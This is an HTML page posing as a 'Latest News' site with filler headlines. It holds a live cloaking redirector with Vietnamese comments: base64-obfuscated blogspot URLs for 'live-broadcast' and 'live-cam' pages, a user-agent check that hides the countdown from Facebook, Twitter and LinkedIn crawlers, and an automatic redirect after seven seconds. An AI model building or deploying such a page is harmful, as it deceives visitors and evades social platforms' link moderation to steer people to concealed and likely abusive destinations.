<!DOCTYPE html>
<html>
<head>
    <title>News Updates</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #f0f2f5;
            color: #333;
        }
        .simple-countdown {
            text-align: center;
            background: #ff4444;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .countdown-number {
            font-size: 2rem;
            font-weight: bold;
            margin: 5px 0;
        }
        .subdomain-info {
            background: #e9ecef;
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            text-align: center;
            font-family: monospace;
        }
        .news-container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .news-item {
            background: #f8f9fa;
            margin: 10px 0;
            padding: 12px;
            border-radius: 8px;
            border-left: 4px solid #4285f4;
        }
        .news-title {
            font-size: 1rem;
            margin-bottom: 5px;
            line-height: 1.4;
        }
        .news-meta {
            font-size: 0.8rem;
            color: #666;
            display: flex;
            justify-content: space-between;
        }
        .loading {
            text-align: center;
            padding: 20px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="simple-countdown" id="countdown-section">
        <div>Please wait</div>
        <div class="countdown-number" id="countdown">7</div>
        <div>Redirecting to content...</div>
    </div>

    <div class="subdomain-info" id="subdomain-info">
        Access from: <span id="current-subdomain">Loading...</span>
    </div>

    <div class="news-container">
        <h2 style="text-align: center; margin-bottom: 20px;">📰 Latest News</h2>
        <div id="news-container">
            <div class="loading">Loading latest news from Google...</div>
        </div>
    </div>

    <script>
        // 🎯 DOMAIN THẬT CỦA BẠN
        const ENCRYPTED_TARGETS = [
            'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
            'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
        ];

        // 🎯 LẤY SUBDOMAIN HIỆN TẠI
        function getCurrentSubdomain() {
            const hostname = window.location.hostname;
            const parts = hostname.split('.');
            
            // Cho Netlify: subdomain.xbling.netlify.app
            if (parts.length >= 3 && parts[1].includes('xbling')) {
                return parts[0];
            }
            return 'main';
        }

        // 🎲 GIẢI MÃ DOMAIN THẬT
        function decryptTarget(encrypted) {
            return atob(encrypted);
        }

        // 🎲 CHỌN TARGET NGẪU NHIÊN
        function getRandomTarget() {
            const randomIndex = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
            const encryptedTarget = ENCRYPTED_TARGETS[randomIndex];
            return decryptTarget(encryptedTarget);
        }

        // 🛡️ PHÁT HIỆN FACEBOOK BOT
        function isFacebookBot() {
            return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
        }

        // 📡 RSS ĐƠN GIẢN - KHÔNG PHỨC TẠP
        function loadSimpleNews() {
            const newsList = [
                "Global leaders convene for international summit",
                "Technology sector announces innovative breakthroughs",
                "Financial markets demonstrate steady growth patterns",
                "Sports organizations update competition schedules",
                "Scientific community shares research developments",
                "Entertainment industry releases new content",
                "Healthcare advances improve medical services",
                "Environmental initiatives gain global support"
            ];
            
            let newsHTML = '';
            newsList.forEach(news => {
                newsHTML += `
                    <div class="news-item">
                        <div class="news-title">${news}</div>
                        <div class="news-meta">
                            <span>News Network</span>
                            <span>Today</span>
                        </div>
                    </div>
                `;
            });
            
            document.getElementById('news-container').innerHTML = newsHTML;
        }

        // ⏱️ COUNTDOWN
        function startCountdown() {
            const currentSubdomain = getCurrentSubdomain();
            
            document.getElementById('current-subdomain').textContent = currentSubdomain;
            
            if (isFacebookBot()) {
                document.getElementById('countdown-section').style.display = 'none';
                document.getElementById('subdomain-info').style.display = 'none';
                return;
            }
            
            let seconds = 7;
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                seconds--;
                countdownElement.textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(timer);
                    const targetSite = getRandomTarget();
                    window.location.href = targetSite;
                }
            }, 1000);
        }

        // 🚀 INITIALIZE
        document.addEventListener('DOMContentLoaded', function() {
            loadSimpleNews();
            startCountdown();
        });
    </script>
</body>
</html>
